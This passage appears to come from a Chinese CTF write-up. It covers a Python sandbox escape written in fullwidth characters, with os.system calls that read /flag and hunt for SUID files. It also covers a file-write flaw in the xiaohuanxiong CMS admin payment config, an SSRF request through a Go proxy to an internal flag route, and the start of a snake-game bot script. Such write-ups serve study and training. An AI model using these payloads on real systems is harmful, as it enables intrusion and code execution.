class=\"string\">＇；＿＿ｉｍｐｏｒｔ＿＿（＇ｓｙｓ＇）．ｍｏｄｕｌｅｓ［＇＿＿ｍａｉｎ＿＿＇］．＿＿ｄｉｃｔ＿＿［＇＿＿ｂｕｉｌｔｉｎｓ＿＿＇］．＿＿ｄｉｃｔ＿＿［＇ｌｅｎ＇］ ＝ ｌａｍｂｄａ ｘ： １\\nｐｒｉｎｔ（ｌｅｎ（＂ａａａａａａ＂））\\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ｌｓ＇）\\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ＬＦＩＬＥ＝ｆｉｌｅ＿ｔｏ＿ｒｅａｄ ｄｄ ｉｆ＝／ｆｌａｇ＇）\\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ｆｉｎｄ ／ －ｕｓｅｒ ｒｏｏｔ －ｐｅｒｍ －４０００ －ｐｒｉｎｔ ２＞／ｄｅｖ／ｎｕｌｌ＇）＃</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xiaohuanxiong\"><a class=\"markdownIt-Anchor\" href=\"#xiaohuanxiong\">#</a> xiaohuanxiong：</h2>\n<p>​\t\t项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZvcmthYmxlL3hpYW9odWFueGlvbmc=\">https://github.com/forkable/xiaohuanxiong</span></p>\n<p>​\t\t开始审计：</p>\n<p>​\t\t存在 admin 文件夹，那估计洞可能在 admin 里面，先看里面：</p>\n<ol>\n<li>Admins 有创建、管理、删除管理员用户的功能，推测可能会有洞，但实际上并没有用到这里。</li>\n<li>Areas、Authors、Banners、BaseAdmin、Books、Chapters 一直到 Login 都没啥用，就正常的管理系统</li>\n</ol>\n<p>​\t\t当看到 Payment 的时候，发现了一个重要的点：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//支付配置文件</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;request-&gt;<span class=\"title function_ invoke__\">isPost</span>()) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">input</span>(<span class=\"string\">&#x27;json&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"title class_\">App</span>::<span class=\"title function_ invoke__\">getRootPath</span>() . <span class=\"string\">&#x27;config/payment.php&#x27;</span>, <span class=\"variable\">$content</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">success</span>(<span class=\"string\">&#x27;保存成功&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"title class_\">App</span>::<span class=\"title function_ invoke__\">getRootPath</span>() . <span class=\"string\">&#x27;config/payment.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">assign</span>(<span class=\"string\">&#x27;json&#x27;</span>, <span class=\"variable\">$content</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">view</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t保存配置文件，存在文件写入的问题，写入的还是 php 文件，之后进入 admin/payment 看看，发现了这些：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/5d7af358c0c44f88a3533e0b7ad15c01.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t这里面写入 payload 即可：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/fe6bfe2f95e64d48ad701b6676f12492.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t<img data-src=\"https://i-blog.csdnimg.cn/direct/fbe689cea973480aa83b960ff34ec977.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;2db4c362-5f6f-4c81-b77e-d27ec7fcb6aa&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"proxy\"><a class=\"markdownIt-Anchor\" href=\"#proxy\">#</a> proxy：</h2>\n<p>​\t\t这段代码定义了一个使用 Gin 框架的 Go Web 服务器，它提供了两个 API 接口，分别位于  <code>/v1/api/flag</code>  和  <code>/v2/api/proxy</code></p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;bytes&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;io&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;net/http&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;os/exec&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> ProxyRequest <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tURL             <span class=\"type\">string</span>            <span class=\"string\">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class=\"line\">\tMethod          <span class=\"type\">string</span>            <span class=\"string\">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class=\"line\">\tBody            <span class=\"type\">string</span>            <span class=\"string\">`json:&quot;body&quot;`</span></span><br><span class=\"line\">\tHeaders         <span class=\"keyword\">map</span>[<span class=\"type\">string</span>]<span class=\"type\">string</span> <span class=\"string\">`json:&quot;headers&quot;`</span></span><br><span class=\"line\">\tFollowRedirects <span class=\"type\">bool</span>              <span class=\"string\">`json:&quot;follow_redirects&quot;`</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tr := gin.Default()</span><br><span class=\"line\"></span><br><span class=\"line\">\tv1 := r.Group(<span class=\"string\">&quot;/v1&quot;</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tv1.POST(<span class=\"string\">&quot;/api/flag&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">\t\t\tcmd := exec.Command(<span class=\"string\">&quot;/readflag&quot;</span>)</span><br><span class=\"line\">\t\t\tflag, err := cmd.CombinedOutput()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\tc.JSON(http.StatusInternalServerError, gin.H&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;error&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tc.JSON(http.StatusOK, gin.H&#123;<span class=\"string\">&quot;flag&quot;</span>: flag&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tv2 := r.Group(<span class=\"string\">&quot;/v2&quot;</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tv2.POST(<span class=\"string\">&quot;/api/proxy&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">var</span> proxyRequest ProxyRequest</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\tc.JSON(http.StatusBadRequest, gin.H&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;error&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Invalid request&quot;</span>&#125;)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tclient := &amp;http.Client&#123;</span><br><span class=\"line\">\t\t\t\tCheckRedirect: <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(req *http.Request, via []*http.Request)</span></span> <span class=\"type\">error</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> !req.URL.IsAbs() &#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">return</span> http.ErrUseLastResponse</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">return</span> http.ErrUseLastResponse</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span></span><br><span class=\"line\">\t\t\t\t&#125;,</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\treq, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class=\"type\">byte</span>(proxyRequest.Body)))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\tc.JSON(http.StatusInternalServerError, gin.H&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;error&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> key, value := <span class=\"keyword\">range</span> proxyRequest.Headers &#123;</span><br><span class=\"line\">\t\t\t\treq.Header.Set(key, value)</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tresp, err := client.Do(req)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\tc.JSON(http.StatusInternalServerError, gin.H&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;error&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">defer</span> resp.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tbody, err := io.ReadAll(resp.Body)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\tc.JSON(http.StatusInternalServerError, gin.H&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;error&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tc.Status(resp.StatusCode)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> key, value := <span class=\"keyword\">range</span> resp.Header &#123;</span><br><span class=\"line\">\t\t\t\tc.Header(key, value[<span class=\"number\">0</span>])</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tc.Writer.Write(body)</span><br><span class=\"line\">\t\t\tc.Abort()</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr.Run(<span class=\"string\">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t先看看 /v1/api/flag：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1 := r.Group(<span class=\"string\">&quot;/v1&quot;</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tv1.POST(<span class=\"string\">&quot;/api/flag&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">\t\t\tcmd := exec.Command(<span class=\"string\">&quot;/readflag&quot;</span>)</span><br><span class=\"line\">\t\t\tflag, err := cmd.CombinedOutput()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\tc.JSON(http.StatusInternalServerError, gin.H&#123;<span class=\"string\">&quot;status&quot;</span>: <span class=\"string\">&quot;error&quot;</span>, <span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tc.JSON(http.StatusOK, gin.H&#123;<span class=\"string\">&quot;flag&quot;</span>: flag&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t读取 flag 文件， 然后返回输出。</p>\n<p>​\t\t <code>/v2/api/proxy</code>  存在 ssrf。直接访问 flag 无法访问，因此需要 ssrf。</p>\n<p>​\t\t正好，给了配置文件：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    listen <span class=\"number\">8000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    location ~ /v1 <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        return <span class=\"number\">403</span>;</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    location ~ /v2 <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        proxy_pass http<span class=\"punctuation\">:</span><span class=\"comment\">//localhost:8769;</span></span><br><span class=\"line\">        proxy_http_version <span class=\"number\">1.1</span>;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header Upgrade $http_upgrade;</span><br><span class=\"line\">        proxy_set_header Connection $connection_upgrade;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t根据 <code>proxy_set_header X-Real-IP $remote_addr;</code> , 可以确定能打 ssrf。</p>\n<p>​\t\t/v2/api/proxy 是以 json 形式发包的，可以搞：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/v2/api/proxy</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>39.107.225.62:30903</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/json</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>142</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-css\">&#123;&quot;url&quot;:<span class=\"string\">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class=\"string\">&quot;method&quot;</span>:<span class=\"string\">&quot;POST&quot;</span>,<span class=\"string\">&quot;headers&quot;</span>:&#123;&quot;<span class=\"attribute\">Content</span>-Type&quot;:<span class=\"string\">&quot;application/json&quot;</span>&#125;,&quot;<span class=\"selector-tag\">body</span>&quot;:<span class=\"string\">&quot;&quot;</span>,<span class=\"string\">&quot;follow_redirects&quot;</span>:false</span></span><br><span class=\"line\"><span class=\"language-css\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t响应：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.27.0</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Sun, 03 Nov 2024 07:11:08 GMT</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/json; charset=utf-8</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>67</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-json\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;flag&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;ZmxhZ3tkM2MxNzZjZC05ZjhiLTRlOWQtOWM3Yi1mYzgyZTUxYzUwOTd9&quot;</span><span class=\"punctuation\">&#125;</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"snake\"><a class=\"markdownIt-Anchor\" href=\"#snake\">#</a> snake：</h2>\n<p>​\t\t打游戏，写个脚本去跑，先审 js，发现了一些信息，比如 move 路由什么的，直接拿去写脚本，网上找了一圈，找到一些算法， 都改一改拿去试，最后这个能跑：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> heapq</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始方向</span></span><br><span class=\"line\">current_direction = <span class=\"string\">&#x27;RIGHT&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://eci-2ze4zqdxex49cesyexgc.cloudeci1.ichunqiu.com:5000/move&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发送方向请求并获取游戏状态</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_direction_and_get_state</span>(<span class=\"params\">direction</span>):</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;session=eyJ1c2VybmFtZSI6ImcwMWRlbiJ9.ZycoKQ.BlD0y752_1q7iLu3ZVk5tsO6fKo&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    data = json.dumps(&#123;<span class=\"string\">&quot;direction&quot;</span>: direction&#125;)</span><br><span class=\"line\">    response = requests.post(url, headers=headers, data=data)</span><br><span 